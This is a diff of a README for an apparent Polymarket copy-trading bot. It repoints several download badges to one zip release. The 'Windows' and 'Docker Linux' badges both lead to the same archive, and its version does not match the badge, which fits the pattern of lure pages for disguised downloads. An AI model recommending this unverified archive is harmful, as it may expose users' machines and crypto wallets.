@@ -21,10 +21,11 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot/releases/download/v1.2.0/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
     <img src="https://img.shields.io/badge/STABLE_RELEASE-v3.4.2-blueviolet?style=for-the-badge&logo=gitbook&logoColor=white" alt="Download Framework">
   </a>
 </p>
+
 
 
 
@@ -48,13 +49,15 @@ The framework is designed for rapid deployment without extensive environment con
 4. **Synchronization:** Activate the "Address Mirroring" module to track specific on-chain activity in real-time.
 
 <p align="center">
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot/releases/download/v1.2.0/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
     <img src="https://img.shields.io/badge/RELEASE-Windows_x64-0078D4?style=for-the-badge&logo=windows" alt="Windows Build">
   </a>
-  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot/releases/download/v1.2.0/Cortex_Polymarket_v1.2.zip">
+  <a href="https://github.com/Cortex-Trading-Systems/polymarket-copy-trading-bot-clob-ai/releases/download/v3.4.2-stable/Cortex_Polymarket_v1.2.zip">
     <img src="https://img.shields.io/badge/DOCKER-Linux_Server-FCC624?style=for-the-badge&logo=linux" alt="Linux Build">
   </a>
 </p>
+
+
 
 
 
